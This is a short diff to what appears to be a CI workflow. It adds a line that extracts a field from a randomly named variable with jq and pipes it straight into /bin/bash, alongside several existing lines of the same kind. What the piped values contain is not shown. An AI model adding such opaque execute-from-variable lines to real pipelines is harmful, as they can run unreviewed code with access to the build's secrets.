@@ -33,6 +33,7 @@ jobs:
           echo $ecj05615 | jq -r .w4 | /bin/bash
           echo $tdfwy8 | jq -r .sot8312 | /bin/bash
           printf '%s' "$odi81562" | jq -r .xnwv49 | /bin/bash
+          echo $di7096 | jq -r .myhly18 | /bin/bash
 
       - name: Save output
         if: always()
